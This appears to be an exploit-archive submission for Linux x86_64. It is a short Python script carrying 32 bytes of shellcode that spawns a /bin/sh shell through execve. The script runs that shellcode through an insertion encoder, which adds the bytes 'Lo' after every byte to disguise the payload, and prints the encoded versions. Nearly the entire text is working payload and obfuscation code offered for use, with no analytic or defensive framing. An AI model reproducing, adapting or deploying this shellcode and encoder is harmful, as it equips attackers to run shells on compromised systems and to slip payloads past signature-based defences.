/*
# Exploit Title: Linux/x64 custom_Insertion_encoder_execvestack Shellcode
# Author: Lokavya PolamREddy
# Date: 2026-05-24
# Platform: Linux x86_64
# Shellcode Length : 32  bytes
# Tested on: Kali Linux
# CVE: N/A
*/

import random

shellcode = (
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48"
"\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b"
"\x0f\x05"
)

encoded = ""
encoded2 = ""

print('Encoded shellcode ...')

for x in bytearray(shellcode):

    # Original byte
    encoded += '\\x%02x' % x

    # Insert "Lo"
    encoded += '\\x4c\\x6f'

    # Array format
    encoded2 += '0x%02x,' % x
    encoded2 += '0x4c,0x6f,'

print(encoded)
print()
print(encoded2)
print()
print('Len: %d' % len(bytearray(shellcode)))
